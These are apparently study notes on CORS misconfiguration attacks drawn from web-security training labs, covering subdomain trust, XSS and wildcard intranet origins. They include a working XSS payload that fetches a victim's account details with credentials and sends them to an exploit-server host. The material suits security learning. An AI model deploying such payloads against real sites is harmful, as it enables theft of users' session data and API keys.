# XSS via CORS trust relationships

If the trusted site has an XSS, then could be a problem for the other server.

**Request**
~~~
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
~~~

**Response**
~~~
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
~~~

`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

## Breaking TLS with poorly configured CORS

App with HTTPS whitelists a trusted subdomain that has HTTP

### Example

Redirects user to a XSS vulnerable URL 

~~~
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
~~~

Intranets and CORS without credentials
~~~
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
~~~
~~~
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
~~~
